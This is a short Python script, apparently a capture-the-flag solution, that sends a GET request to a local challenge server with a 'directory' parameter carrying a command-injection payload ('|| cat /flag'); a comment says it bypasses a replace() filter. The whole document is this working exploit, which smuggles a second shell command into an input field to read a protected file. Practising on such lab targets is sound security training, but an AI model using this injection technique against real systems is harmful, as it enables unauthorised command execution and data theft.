from requests import request

method = "GET"
site = "http://challenge.localhost"
port = 80

# Bypass applied filters(the replace() function).
params = { "directory": " /some-non-existent-file || cat /flag" }

url = f"{site}:{port}/"

response = request(method, url, params = params)

print(f"\nResponse: {response.text}")
